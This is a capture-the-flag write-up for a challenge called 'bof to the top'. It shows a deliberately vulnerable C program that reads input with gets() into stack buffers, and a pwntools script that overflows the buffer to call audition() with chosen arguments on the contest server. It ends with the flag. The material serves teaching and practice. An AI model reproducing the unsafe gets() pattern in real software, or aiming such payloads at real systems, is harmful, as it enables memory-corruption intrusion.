# bof to the top

The `main()` funtion calls `get_audition_info()` which calls `gets()` function that allows buffer overflow<br>

[bof.c](./bof.c)
```C
#include "stdio.h"
#include "string.h"
#include "stdlib.h"

// gcc -m32 -fno-stack-protector -no-pie bof.c -o bof

void audition(int time, int room_num){
	char* flag = "/bin/cat flag.txt";
	if(time == 1200 && room_num == 366){
		system(flag);
	}
}

void get_audition_info(){
	char name[50];
	char song[50];
	printf("What's your name?\n");
	gets(name);
	printf("What song will you be singing?\n");
	gets(song);
}

void welcome(){
	printf("Welcome to East High!\n");
	printf("We're the Wildcats and getting ready for our spring musical\n");
	printf("We're now accepting signups for auditions!\n");
}

int main(){
	welcome();
	get_audition_info();
	return 0;
}
```

To exploit this program we have to jump to `audition()` fuctions that requires two integers as arguments<br>
time and room_num, so we have to send junk input followed by `audition()` function address and the two arguments<br>

[exploit.py](./exploit.py)
```python
#!/usr/bin/env python2
from pwn import *

audition = p32(0x08049182)
time     = p32(0x4b0)
room_num = p32(0x16e)
payload  = 'a'* 112 + audition + 'a'*4 + time + room_num

conn = remote('ctf.umbccd.io', 4000)
#conn = process('./bof')

conn.sendlineafter('?', 'name')
conn.sendlineafter('?', payload)
print conn.recvall()
conn.close
```
### flag
`DawgCTF{wh@t_teAm?}`
